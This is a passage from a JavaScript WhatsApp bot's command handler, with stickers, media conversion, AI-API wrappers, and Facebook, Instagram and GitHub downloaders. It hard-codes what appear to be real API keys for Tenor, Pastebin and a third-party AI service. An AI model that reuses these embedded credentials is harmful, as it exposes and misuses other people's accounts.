    case 'sound220':
    case 'sound221':
    case 'sound222':
    case 'sound223':
    case 'sound224':
    case 'sound225':
    case 'sound226':
    case 'sound227':
    case 'sound228':
    case 'sound229':
    case 'sound230':
    case 'sound231':
    case 'sound232':
    case 'sound233':
    case 'sound234':
    case 'sound235':
    case 'sound236':
    case 'sound237':
    case 'sound238':
    case 'sound239':
    case 'sound240':
    case 'sound241':
    case 'sound242':
    case 'sound243':
    case 'sound244':
    case 'sound245':
    case 'sound246':
    case 'sound247':
    case 'sound248':
    case 'sound249':
    case 'sound250': {
    
try {
        let link = `https://raw.githubusercontent.com/Leoo7z/Music/main/${command}.mp3`
        await sock.sendMessage(m.chat, {
          audio: {
            url: link
          },
          mimetype: 'audio/mpeg',
          seconds: 99999999999,
          contextInfo: {
isForwarded: false, 
forwardingScore: 1, 
businessMessageForwardInfo: { businessOwnerJid: "0@newsletter" }, forwardedNewsletterMessageInfo: { newsletterName: `© ${namaBot}`, newsletterJid: "0@newsletter" }, 
externalAdReply: {
title: name,
body: `version • ${version}`,
thumbnailUrl: thumbnail2,
sourceUrl: `https://Uptime • ${runtime(process.uptime())}`,
mediaType: 1,
renderLargerThumbnail: false,
}}
        }, {
          quoted: fakeQuoted
        })
      } catch (err) {
        m.reply(`Terjadi kesalahan: ${err}`)
      }
    }
    break
case 'emojimix': {

let [emoji1, emoji2] = q.split`+`
if (!emoji1) return reply(`\n*Penggunaan Salah!*\nKetik .emojimix 😄+😏\n`)
if (!emoji2) return reply(`\n*Penggunaan Salah!*\nKetik .emojimix 😄+😏\n`)
reply("Proses...")
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await sock.sendImageAsSticker(m.chat, res.url, m, {
packname: namaBot,
author: namaBot,
categories: res.tags,
})
await fs.unlinkSync(encmedia)
}
 
}

break 
case "tourl2": {

  if (!quoted) return reply(`Fotonya Mana?`)
if (!/image|video|audio/.test(mime)) return reply(`Send/Reply Foto Dengan Caption ${cmd}`)
reply("Tunggu sebentar...")
let media = await sock.downloadAndSaveMediaMessage(quoted);
let response = await uploaden(media);
    try {
        const msg = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        // BODY ADALAH TEKS UTAMA PESAN
                        body: proto.Message.InteractiveMessage.Body.create({
                            text: teks  // <-- sebelumnya kosong ('')
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({
                            title: name || 'Lyrra-MD', // opsional
                            subtitle: '',
                            hasMediaAttachment: false
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: [
                                {
                                    name: 'cta_copy',
                                    buttonParamsJson: JSON.stringify({
                                        display_text: 'Copy Url',
                                        id: response,
                                        copy_code: response
                                    })
                                }
                            ]
                        })
                    })
                }
            }
        }, {});

        await sock.relayMessage(msg.key.remoteJid, msg.message, {
            messageId: msg.key.id
        });

    } catch (e) {
        console.error('❌ Error mengirim tombol salin:', e);
    }
}
  break
case 'rbg':
case 'removebg':
case 'nobg': {

const q = m.quoted ? m.quoted : m;
    const mime = (q.msg || q).mimetype || '';
 
    if (!/image/.test(mime)) {
        return reply(`mana foto nya?`);
    }
 
    reply('Loading...');

    try {
        
        let media = await sock.downloadAndSaveMediaMessage(quoted);
        let directLink = await uploaden(media);
        
        const apiUrl = `https://kyyokatsurestapi.my.id/tools/removebg?url=${directLink}`;
        
        const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
        const imageBuffer = Buffer.from(response.data);
 
        const finalCaption = ``;
 
        await sock.sendMessage(m.chat, {
            image: imageBuffer,
            caption: ""
        }, { quoted: fakeQuoted });
 
    } catch (error) {
        console.error('Error di fitur aiedit:', error);
        reply(`❌ Terjadi kesalahan saat memproses gambar.`);
    } finally {
        if (mediaPath && fs.existsSync(mediaPath)) {
            fs.unlinkSync(mediaPath);
        }
    }
}
break
case "pestebin": {

 if (!text) return m.reply(`📌 Contoh:\n${cmd} Ini contoh teks yang akan diunggah ke Pastebin`)

  const api_dev_key = 'h9WMT2Mn9QW-qDhvUSc-KObqAYcjI0he' // Ganti dengan API key dari akun Pastebin kamu
  const api_paste_code = text.trim()
  const api_paste_name = `Paste dari ${m.pushName || 'User'}`
  
  const data = new URLSearchParams({
    api_dev_key,
    api_option: 'paste',
    api_paste_code,
    api_paste_name
  })

  try {
    const res = await axios.post('https://pastebin.com/api/api_post.php', data.toString(), {
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
    })
    const url = res.data
    if (url.startsWith('Bad API request')) {
      return m.reply('❌ Gagal membuat Pastebin:\n' + url)
    }
    m.reply(`✅ *Berhasil membuat paste:*\n${url}`)
  } catch (e) {
    console.error(e)
    m.reply('⚠️ Gagal mengirim permintaan ke Pastebin.')
  }
}
break
case "getpp": {

let target = m.quoted ? m.quoted.sender : m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : null
if (!target) return reply("Reply/@tag target nya")

var ppuser
try {
ppuser = await sock.profilePictureUrl(target, 'image')
} catch (err) {
ppuser = 'https://files.catbox.moe/ejy4ky.jpg'
}
return sock.sendMessage(m.chat, {image: {url: ppuser}, caption: `Sukses mengambil profil @${target.split("@")[0]}`, mentions: target}, {quoted: fakeQuoted})
}
break
case "iqc": {

if (!text) return m.reply(`Contoh: ${command} kenapa sock ganteng`)
    
    await sock.sendMessage(m.chat, {image: {url: `https://api-faa.my.id/faa/iqc?prompt=${text}` }, caption: "" }, {quoted: fakeQuoted})
}
break
case "bratvid": {         

if (!text) return m.reply(`Contoh: ${command} hai`)
      if (text.length > 250) return m.reply(`Karakter terbatas, max 250!`)

      const words = text.split(" ")
      const tempDir = path.join(process.cwd(), 'cache')
      if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir)
      const framePaths = []
        for (let i = 0; i < words.length; i++) {
          const currentText = words.slice(0, i + 1).join(" ")

          const res = await axios.get(
            `https://aqul-brat.hf.space/?text=${encodeURIComponent(currentText)}`, {
              responseType: "arraybuffer"
            }
          ).catch((e) => e.response)

          const framePath = path.join(tempDir, `frame${i}.mp4`)
          fs.writeFileSync(framePath, res.data)
          framePaths.push(framePath)
        }

        const fileListPath = path.join(tempDir, "filelist.txt")
        let fileListContent = ""

        for (let i = 0; i < framePaths.length; i++) {
          fileListContent += `file '${framePaths[i]}'\n`
          fileListContent += `duration 0.5\n`
        }

        fileListContent += `file '${framePaths[framePaths.length - 1]}'\n`
        fileListContent += `duration 1.5\n`

        fs.writeFileSync(fileListPath, fileListContent)
        const outputVideoPath = path.join(tempDir, "output.mp4")

        execSync(
          `ffmpeg -y -f concat -safe 0 -i ${fileListPath} -vf "fps=30" -c:v libx264 -preset superfast -pix_fmt yuv420p ${outputVideoPath}`
        )

        await sock.sendImageAsSticker(m.chat, outputVideoPath, m, {
          packname: namaBot,
          author: namaBot,
        })

        framePaths.forEach((frame) => {
          if (fs.existsSync(frame)) fs.unlinkSync(frame)
        })
        if (fs.existsSync(fileListPath)) fs.unlinkSync(fileListPath)
        if (fs.existsSync(outputVideoPath)) fs.unlinkSync(outputVideoPath)
}
break
case "brat": {
  if (!text) return m.reply(`Contoh: ${cmd} hai`)
  if (text.length > 250) return m.reply(`Karakter terbatas, max 250!`)

  const encode = encodeURIComponent(text)
  const jion = `https://api.siputzx.my.id/api/m/brat?text=${encode}&isAnimated=false&delay=500`

  await sock.sendImageAsSticker(m.chat, jion, m, {
    packname: ".",
    author: ".",
  })
}
break
case 'hd':
case 'tohd':
case 'Enhanced':
case 'remini': {
  if (!quoted) return reply('Fotonya mana?')
  if (!/image/.test(mime)) return reply(`Send/Reply Foto dengan caption ${cmd}`)
  reply('Enhancing foto, tunggu sebentar...')

  try {
    let media = await sock.downloadAndSaveMediaMessage(quoted)
    let zion = await uploaden(media)

    let result = "https://api.deline.web.id/tools/hd?url="+zion
   

    await sock.sendMessage(
      m.chat,
      {
        image: { url: result },
        caption: name
      },
      { quoted: fakeQuoted }
    )

  } catch (e) {
    console.log(e)
    reply('Terjadi error')
  }
}
break
case 'smeme': case 'stickermeme': case 'stickmeme': {

await sock.sendMessage(m.chat, {react: {text: '🚀', key: m.key}})
if (!/webp/.test(mime) && /image/.test(mime)) {
if (!text) return m.reply(`Usage: ${cmd} text1|text2`)
atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
mee = await sock.downloadAndSaveMediaMessage(quoted)
mem = await UploadFileUgu(mee)
meme = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${mem.url}`
memek = await sock.sendImageAsSticker(m.chat,
 meme, m, {
 packname: `Whatsapp Bot ${namaOwner}`,
 })
} else {
m.reply(`Kirim/Balas Gambar Dengan Caption ${cmd} text1|text2`)
}
}
break
case 'stickerwm':
case 'wm':
case 'stikerwm':
case 'swm': {

if (!text) return reply("Text Nya mana?")
if (!/image|video/gi.test(mime)) return m.reply("dengan kirim media")
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
var image = await sock.downloadAndSaveMediaMessage(qmsg)
await sock.sendImageAsSticker(m.chat,
 image, m, {
 packname: text,
 
 })
await fs.unlinkSync(image)
sock.sendMessage(m.chat, { react: { text: '✅', key: m.key }})
}

break
        case 'toimage': case 'toimg': {
    if (!(await useLimit(m.sender, 5))) 
        return m.reply(`❌ *LIMIT TIDAK CUKUP!*\n\n${getLimitInfo(m.sender)}\n\n💡 *Cara mendapatkan limit:*\n• .daily - Claim limit harian\n• .buylimit - Beli limit dengan uang`)
    
    if (!quoted) return reply('Reply sticker dengan caption *' + cmd + '*')
    
    // Cek apakah quoted message adalah sticker
    if (!/webp/.test(mime)) return reply(`Balas sticker dengan caption *${cmd}*`)
    
    try {
        let media = await sock.downloadAndSaveMediaMessage(quoted)
        let ranPng = './tmp/' + Date.now() + '.png'
        let ranMp4 = './tmp/' + Date.now() + '.mp4'
        
        // Pastikan folder tmp exists
        if (!fs.existsSync('./tmp')) fs.mkdirSync('./tmp', { recursive: true })
        
        // Deteksi tipe sticker
        const isAnimated = quoted.message?.stickerMessage?.isAnimated || false
        
        if (isAnimated) {
            // Sticker video/animated - convert ke video
            exec(`ffmpeg -i "${media}" -c:v libx264 -pix_fmt yuv420p -movflags +faststart "${ranMp4}"`, async (err) => {
                // Hapus file media original
                if (fs.existsSync(media)) fs.unlinkSync(media)
                
                if (err) {
                    console.error('FFmpeg Error:', err)
                    if (fs.existsSync(ranMp4)) fs.unlinkSync(ranMp4)
                    return m.reply('❌ Gagal mengkonversi sticker video')
                }
                
                // Tunggu sebentar untuk memastikan file sudah ditulis
                await new Promise(resolve => setTimeout(resolve, 500))
                
                if (fs.existsSync(ranMp4)) {
                    let buffer = fs.readFileSync(ranMp4)
                    await sock.sendMessage(m.chat, { 
                        video: buffer,
                        caption: '✅ Berhasil mengkonversi sticker video ke video'
                    }, {quoted: fakeQuoted})
                    fs.unlinkSync(ranMp4)
                } else {
                    m.reply('❌ File output tidak ditemukan')
                }
            })
        } else {
            // Sticker foto/static - convert ke image
            exec(`ffmpeg -i "${media}" -vf "scale=trunc(iw/2)*2:trunc(ih/2)*2" "${ranPng}"`, async (err) => {
                // Hapus file media original
                if (fs.existsSync(media)) fs.unlinkSync(media)
                
                if (err) {
                    console.error('FFmpeg Error:', err)
                    if (fs.existsSync(ranPng)) fs.unlinkSync(ranPng)
                    return m.reply('❌ Gagal mengkonversi sticker foto. Pastikan FFmpeg terinstall dengan benar.')
                }
                
                // Tunggu sebentar untuk memastikan file sudah ditulis
                await new Promise(resolve => setTimeout(resolve, 500))
                
                if (fs.existsSync(ranPng)) {
                    let buffer = fs.readFileSync(ranPng)
                    await sock.sendMessage(m.chat, { 
                        image: buffer,
                        caption: '✅ Berhasil mengkonversi sticker foto ke gambar'
                    }, {quoted: fakeQuoted})
                    fs.unlinkSync(ranPng)
                } else {
                    m.reply('❌ File output tidak ditemukan')
                }
            })
        }
        
    } catch (error) {
        console.error('Global Error:', error)
        m.reply('❌ Terjadi kesalahan saat memproses sticker')
    }
}
break
case 'tovn': {

if (!/video/.test(mime) && !/audio/.test(mime)) return m.reply(`Reply video/audio dengan caption ${cmd}`)
if (!quoted) return reply(`Reply video/audio dengan caption ${cmd}`)
//await loading()
var dl = await m.quoted.download()
sock.sendMessage(from, {audio: dl, mimetype: 'audio/mpeg', ptt: true }, {quoted: fakeQuoted })
}
break
case 'toaudio': {

if (!/video/.test(mime) && !/audio/.test(mime)) return m.reply(`Reply video/audio dengan caption ${cmd}`)
if (!quoted) return reply(`Reply video/audio dengan caption ${cmd}`)
//await loading()
var dl = await m.quoted.download()
sock.sendMessage(from, {audio: dl, mimetype: 'audio/mpeg', ptt: false }, {quoted: fakeQuoted })
}
break

case "tourl": { 

    if (!/image/.test(mime)) return m.reply("kirim/reply fotonya!");
    const { ImageUploadService } = require('node-upload-images');
    try {
        let mediaPath = await sock.downloadAndSaveMediaMessage(qmsg);
        const service = new ImageUploadService('pixhost.to');
  let buffer = fs.readFileSync(mediaPath);
  let { directLink } = await service.uploadFromBinary(buffer, namaBot+'.png');
  m.reply(directLink)
        await fs.unlinkSync(mediaPath);
    } catch (err) {
        console.error("Tourl Error:", err);
        m.reply("Terjadi kesalahan saat mengubah media menjadi URL.");
    }
}
break;

case "sticker": case "stiker": case "sgif": case "s": {

if (!/image|video/.test(mime)) return reply("Kirim foto nya!")
if (/video/.test(mime)) {
if ((qmsg).seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
}
var media = await sock.downloadAndSaveMediaMessage(qmsg)
await sock.sendImageAsSticker(m.chat,
 media, m, {
 packname: `Whatsapp Bot ${namaOwner}`,
 
 })
await fs.unlinkSync(media)
}
break
case "idch":
case "cekidch": {

if (!text) return m.reply("linkchnya")
if (!text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await sock.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}
`
    const msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    // TEKS UTAMA PESAN
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: teks // pastikan variabel `teks` sudah didefinisikan
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        title: name || 'Lyrra-MD', // opsional
                        subtitle: '',
                        hasMediaAttachment: false
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
              {
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({
                  display_text: "Copy ID",
                  id: res.id,
                  copy_code: res.id
               })
                            }
                        ]
                    })
                })
            }
        }
    }, {});

    await sock.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });

} 
			break
			
			// --- tambahkan di file utama bot kamu --- //
			case 'veo3': 
			case "sora2": {
  if (!text) return reply("Contoh:\n.sora2 kucing lucu lompat di jendela")

  const axios = require("axios")
  const sleep = ms => new Promise(r => setTimeout(r, ms))

  reply("🎬 Membuat video... mohon tunggu")

  // 1. CREATE TASK
  let create = await axios.get(
    "https://fgsi.dpdns.org/api/ai/sora2",
    {
      params: {
        apikey: "fgsiapi-207e0c26-6d",
        prompt: text,
        ratio: "",
        enhancePrompt: "true"
      }
    }
  )

  if (!create.data.status) {
    return reply("Gagal membuat task")
  }

  let pollUrl = create.data.data.pollUrl
  let status = "Pending"
  let result

  // 2. POLLING STATUS
  while (status === "Pending") {
    await sleep(5000) // jeda 5 detik
    let poll = await axios.get(pollUrl)

    status = poll.data.data.status

    if (status === "Success") {
      result = poll.data.data.result
      break
    }
  }

  if (!result || !result.url) {
    return reply("Gagal mendapatkan hasil video")
  }

  // 3. KIRIM VIDEO DARI URL
  await sock.sendMessage(m.chat, {
    video: { url: result.url },
    mimetype: "video/mp4",
    caption: `🎥 *SORA2 RESULT*\n\nPrompt:\n${result.prompt_original}`
  }, { quoted: fakeQuoted })

}
break
			case 'texttomusic':
			case 'txttomusic':
			case "txt2music": {
  try {
    if (!text) return reply(
      `Contoh:\n${cmd} zion|happy|folk|bestfriend`
    )

    const [name, mood, genre, lyrics] = text.split("|")
    if (!name || !mood || !genre || !lyrics)
      return reply("Format salah!\nnama|mood|genre|lyrics")

    reply("🎵 Membuat musik... mohon tunggu")

    // 1. CREATE TASK
    const create = await axios.get(
      "https://fgsi.dpdns.org/api/ai/music/sonu",
      {
        params: {
          apikey: "fgsiapi-207e0c26-6d",
          name,
          mood,
          genre,
          lyrics
        }
      }
    )

    if (!create.data.status)
      throw "Gagal membuat task musik"

    const taskId = create.data.data.taskId
    const pollUrl = create.data.data.pollUrl

    // 2. POLLING STATUS
    let result
    for (let i = 0; i < 15; i++) {
      await new Promise(res => setTimeout(res, 3000))

      const poll = await axios.get(pollUrl)
      if (poll.data.data.status === "Success") {
        result = poll.data.data.result
        break
      }
    }

    if (!result) throw "Waktu pembuatan musik habis"

    // 3. SEND AUDIO
    await sock.sendMessage(
      m.chat,
      {
        audio: { url: result.url },
        mimetype: "audio/mpeg",
        caption:
`🎶 *TXT TO MUSIC*
• Judul : ${result.name}
• Mood   : ${result.mood}
• Genre  : ${result.genre}

📜 *Lyrics:*
${result.lyrics.slice(0, 500)}...`
      },
      { quoted: fakeQuoted }
    )

  } catch (err) {
    console.error(err)
    reply("❌ Gagal membuat musik, coba lagi nanti")
  }
}
break;
			case 'copilot2':
			case 'copilot-think': {
			if (!text) return m.reply(`${cmd} hai`)
			const api = await fetchJson(`https://api.yupra.my.id/api/ai/copilot-think?text=${text}`)
			const result = api.result;
			m.reply(result)
			}
			break
			
			
			case "elevenlabs": {
    if (!text) {
        return m.reply("Masukkan teks dan nama voice!\nContoh:\n.elevenlabs bella halo nama saya zion");
    }

    const args = text.split(" ");
    const voice = args.shift(); // ambil voice
    const message = args.join(" "); // sisanya jadi text

    if (!voice || !message) {
        return m.reply("Format salah!\nContoh:\n.elevenlabs bella halo dunia");
    }

    try {
        m.reply("🎙️ Sedang mengubah teks menjadi suara...");

        // Gunakan pitch & speed default di API
        const audioBuffer = await Elevenlabs(message, voice);

        await sock.sendMessage(m.chat, {
            audio: audioBuffer,
            mimetype: "audio/mpeg",
            ptt: true
        }, { quoted: fakeQuoted });

    } catch (err) {
        console.error(err);
        m.reply("❌ Gagal generate TTS. Cek voice atau coba lagi nanti.");
    }
}
break;
case "lirik":
case "lyrics": {
if (!text) return m.reply("contoh:"+cmd+" in the stars")
const api = await fetchJson("https://api-faa.my.id/faa/lyrics?q="+text)
const foto = api.result.cover.large
const tittle = api.result.title
const artis = api.result.artist
const album = api.result.album
const lyrics = api.result.lyrics
const teks = `
- tittle : ${tittle}
- artist : ${artis}
- album : ${album}

${lyrics}
`
await sock.sendMessage(m.chat, {
image: { url: foto },
caption: teks
}, { quoted: fakeQuoted });
}
break
			case "perplexity":
			{
			if (!text) return m.reply("contoh :"+cmd+" hai")
			const api = await fetchJson("https://zelapioffciall.koyeb.app/ai/perplexity?text="+text)
			const udah = api.message
			m.reply(udah)
			}
			break
			case "toprompt": {
			
  if (!quoted) return reply(`Fotonya Mana?`)
if (!/image/.test(mime)) return reply(`Send/Reply Foto Dengan Caption ${cmd}`)
reply("Tunggu sebentar...")
let media = await sock.downloadAndSaveMediaMessage(quoted);
let response = await uploaden(media);
const api = await fetchJson(`https://api.deline.web.id/ai/toprompt?url=${response}`)
const result = api.result.translated
m.reply(result)
}
break
			case "aiislam":
			case "islamai": {
			
			if (!text) return m.reply(cmd+" Hai")
			const apiUrl = await fetchJson(`https://api.siputzx.my.id/api/ai/muslimai?query=${text}`)
			const result = apiUrl.data
			m.reply(result)
			}
			break
			case "felo":
			case "feloai": {
			
			if (!text) return m.reply(cmd+" Hai")
			const apiUrl = await fetchJson(`https://api.zenzxz.my.id/api/ai/feloai?query=${text}`)
			const result = apiUrl.data.answer
			m.reply(result)
			}
			break
			case "copilot":
			case "copilotai": {
			
			if (!text) return m.reply(cmd+" Hai")
			const apiUrl = await fetchJson(`https://api.zenzxz.my.id/api/ai/copilotai?message=${text}&model=default`)
			const result = apiUrl.data.text
			m.reply(result)
			}
			break
case 'ocr':
case 'readtext': {

try {
 const q = m.quoted ? m.quoted : m
 const mime =
 (q.msg || q).mimetype ||
 q.mimetype ||
 q.message?.imageMessage?.mimetype

 if (!mime || !/image/.test(mime))
 return reply("⚠️ Kirim atau reply gambar dengan caption *ocr* untuk ekstrak teks.")

 await sock.sendMessage(m.chat, { react: { text: "⏳", key: m.key } })

 const buffer = await q.download()
 const mimeType = /png/.test(mime) ? "image/png" : "image/jpeg"
 const imageBase64 = buffer.toString("base64")

 const url = "https://staging-ai-image-ocr-266i.frontend.encr.app/api/ocr/process"
 const res = await fetch(url, {
 method: "POST",
 headers: { "content-type": "application/json" },
 body: JSON.stringify({ imageBase64, mimeType }),
 })

 if (!res.ok) throw new Error(await res.text())
 const json = await res.json()

 const text = json.extractedText || "Teks tidak ditemukan."
 reply(`📄 *Hasil OCR:*\n\n${text}`)

 await sock.sendMessage(m.chat, { react: { text: "✅", key: m.key } })

 } catch (err) {
 console.error(err)
 reply("❌ Gagal melakukan OCR, coba lagi nanti.")
 await sock.sendMessage(m.chat, { react: { text: "❌", key: m.key } })
 }
}
break			
case 'lyrra':
case 'autoai':
    handleFeatureToggle('autoaigc', command);
    break;
case 'lyrraai':
case 'gpt':
case 'openai':
case 'ai': {

if (!text) return reply(`Contoh : ${cmd} Siapa presiden Indonesia`)
      try {
        const data = await fetchJson(`https://btch.us.kg/openai?text=${encodeURIComponent(text)}`);
    if (data && data.result) {
      loadai(`${data.result}`);
    } else {
      Lyrra(pushname, text);
  }
} catch (e) {
  reply('Terjadi error, coba lagi nanti.');
}

}
break
// DOWNLOAD 
case 'git':
            case 'gitclone': {
              try {
                if (!args[0]) return m.reply(`Contoh: ${cmd} linknya`)
                if (!isUrl(args[0]) && !args[0].includes('github.com')) return m.reply(`Harus berupa link github!`)
                let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
                var [, user, repo] = args[0].match(regex1) || []
                repo = repo.replace(/.git$/, '')
                var url = `https://api.github.com/repos/${user}/${repo}/zipball`
                let filename = (await fetch(url, {
                  method: 'HEAD'
                })).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
                sock.sendMessage(m.chat, {
                  document: {
                    url: url
                  },
                  fileName: filename + '.zip',
                  mimetype: 'application/zip'
                }, {
                  quoted: m
                })
              } catch (err) {
                m.reply('Terjadi kesalahan')
              }
            }
            break
case "fb":
case "fbdl":
case "fbdownload": {
    if (!text.startsWith("https://")) return reply("Masukkan URL Facebook!");

    try {
        await sock.sendMessage(m.chat, { react: { text: "🕖", key: m.key } });

        const res = await fetch(`https://api-faa.my.id/faa/fbdownload?url=${encodeURIComponent(text)}`)
        const json = await res.json();

        if (!json.status) return reply("Gagal mengambil data!");

        const info = json.result.info;
        const media = json.result.media;

        // ==================================================
        //            IMAGE MODE (SLIDE)
        // ==================================================
        if (!media.video_hd && !media.video_sd) {
            let imgArray = [];

            // image yg tersedia
            let images = [];
            if (media.photo_image) images.push(media.photo_image);
            else images.push(media.thumbnail);

            let idx = 0;

            for (let img of images) {
                let prep = await prepareWAMessageMedia({
                    image: { url: img }
                }, { upload: sock.waUploadToServer });

                imgArray.push({
                    header: proto.Message.InteractiveMessage.Header.fromObject({
                        title: `Foto Slide Ke *${idx += 1}*`,
                        hasMediaAttachment: true,
                        ...prep
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                        buttons: [
                            {
                                name: "cta_url",
                                buttonParamsJson: `{"display_text":"Buka Foto","url":"${img}","merchant_url":"https://www.google.com"}`
                            }
                        ]
                    })
                });
            }

            const slideMsg = await generateWAMessageFromContent(m.chat, {
                viewOnceMessageV2Extension: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                            body: proto.Message.InteractiveMessage.Body.fromObject({
                                text: "*FACEBOOK - IMAGE DOWNLOAD*"
                            }),
                            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                                cards: imgArray
                            })
                        })
                    }
                }
            }, {
                userJid: m.sender,
                quoted: fakeQuoted
            });

            await sock.relayMessage(m.chat, slideMsg.message, {
                messageId: slideMsg.key.id
            });

            await sock.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
            return;
        }

        // ==================================================
        //                  VIDEO MODE
        // ==================================================
        const vid = media.video_hd || media.video_sd;
        if (!vid) return reply("Video tidak ditemukan!");

        await sock.sendMessage(m.chat, {
            video: { url: vid },
            caption: `*FACEBOOK - VIDEO DOWNLOADER*\n\n${info.title || ""}`,
            viewOnce: true
        }, { quoted: fakeQuoted });

        await sock.sendMessage(m.chat, { react: { text: "✅", key: m.key } });

    } catch (e) {
        console.log(e)
        reply("Terjadi kesalahan!");
    }
}
break;
case "ig": 
case "igdl":
case "Instagram": {
async function igee_deel(url) {
  try {
    const endpoint = 'https://igram.website/content.php?url=' + encodeURIComponent(url)

    const { data } = await axios.post(endpoint, '', {
      headers: {
        authority: 'igram.website',
        accept: '*/*',
        'accept-language': 'id-ID,id;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        cookie: '',
        referer: 'https://igram.website/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'
      }
    })

    return data
  } catch (e) {
    return { error: e.message }
  }
}

function parse(html) {
  const clean = html.replace(/\n|\t/g, '')

  const videoMatch = [...clean.matchAll(/<source src="([^"]+)/g)].map(x => x[1])
  let imageMatch = [...clean.matchAll(/<img src="([^"]+)/g)].map(x => x[1])

  if (imageMatch.length > 0) imageMatch = imageMatch.slice(1)

  const captionRaw = clean.match(/<p class="text-sm"[^>]*>(.*?)<\/p>/)
  const caption = captionRaw ? captionRaw[1].replace(/<br ?\/?>/g, '\n') : ''

  const likes = clean.match(/far fa-heart"[^>]*><\/i>\s*([^<]+)/)
  const comments = clean.match(/far fa-comment"[^>]*><\/i>\s*([^<]+)/)
  const time = clean.match(/far fa-clock"[^>]*><\/i>\s*([^<]+)/)

  return {
    is_video: videoMatch.length > 0,
    videos: videoMatch,
    images: imageMatch,
    caption,
    likes: likes ? likes[1] : null,
    comments: comments ? comments[1] : null,
    time: time ? time[1] : null
  }
}

function detectContentType(url) {
  if (url.includes('/reel/')) return 'Reel'
  if (url.includes('/stories/')) return 'Story'
  if (url.includes('/p/')) return 'Post'
  return 'Unknown'
}

async function instagram(url) {
  try {
    if (!url || typeof url !== 'string') {
      throw new Error('URL tidak valid')
    }

    const contentType = detectContentType(url)
    const raw = await igee_deel(url)
    
    if (!raw || raw.error) {
      throw new Error(raw.error || 'Gagal mengambil data dari Instagram')
    }

    if (!raw.html) {
      throw new Error('Response tidak memiliki HTML')
    }

    const parsed = parse(raw.html)

    const result = {
      success: true,
      status: raw.status || 'success',
      username: raw.username || null,
      contentType: contentType,
      type: parsed.is_video ? 'video' : 'image',
      caption: parsed.caption || '',
      likes: parsed.likes || null,
      comments: parsed.comments || null,
      time: parsed.time || null,
      media: []
    }

    if (parsed.is_video && parsed.videos.length > 0) {
      result.media = parsed.videos.map((url, idx) => ({
        type: 'video',
        url: url,
        index: idx + 1
      }))
    } else if (parsed.images.length > 0) {
      result.media = parsed.images.map((url, idx) => ({
        type: 'image',
        url: url,
        index: idx + 1
      }))
    }

    if (result.media.length === 0) {
      throw new Error('Tidak ada media yang ditemukan')
    }

    return result

  } catch (error) {
    throw error
  }
}
  try {
    if (!args[0]) {
      return m.reply(`❌ *Masukkan URL Instagram!*\n\n*Contoh:*\n${cmd} https://www.instagram.com/p/xxx\n\n*Support:*\n• Post (Image/Video)\n• Reels\n• Stories\n• Multiple Images`)
    }

    const url = args[0]

    if (!url.match(/instagram\.com|instagr\.am/i)) {
      return m.reply('❌ URL bukan dari Instagram!')
    }

    await m.reply('⏳ *Sedang mengunduh media dari Instagram...*\n_Mohon tunggu sebentar_')

    const result = await instagram(url)

    let captionText = `✅ *Instagram Downloader*\n\n`
    if (result.username) captionText += `👤 *Username:* @${result.username}\n`
    if (result.contentType) captionText += `📌 *Type:* ${result.contentType}\n`
    if (result.likes) captionText += `❤️ *Likes:* ${result.likes}\n`
    if (result.comments) captionText += `💬 *Comments:* ${result.comments}\n`
    if (result.time) captionText += `⏰ *Posted:* ${result.time}\n`
    captionText += `🎬 *Total Media:* ${result.media.length}\n`
    if (result.caption) {
      const shortCaption = result.caption.length > 200 
        ? result.caption.substring(0, 200) + '...' 
        : result.caption
      captionText += `\n📝 *Caption:*\n${shortCaption}`
    }
    
